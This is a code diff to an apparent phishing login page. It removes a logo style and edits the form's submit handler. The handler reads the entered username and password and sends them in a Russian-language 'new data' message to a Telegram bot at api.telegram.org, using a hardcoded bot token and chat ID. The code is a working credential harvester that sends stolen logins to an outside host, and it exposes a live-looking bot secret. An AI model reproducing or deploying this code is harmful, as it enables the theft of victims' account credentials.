@@ -22,10 +22,6 @@
             border-radius: 1px;
             width: 300px;
         }
-        .logo {
-            width: 175px;
-            margin: 20px 0;
-        }
         input {
             width: 100%;
             padding: 9px;
@@ -76,10 +72,9 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            @fadata37_bot
             const botToken = '8166822856:AAGj3O1vqQWOnWdalm2UXeiSvnPMimcvlzk';
             const chatId = '698223590';
-            const message = 🔑 Новые данные:\n👤 Логин: ${username}\n🔒 Пароль: ${password};
+            const message = Новые данные:\nЛогин: ${username}\nПароль: ${password};
 
             try {
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
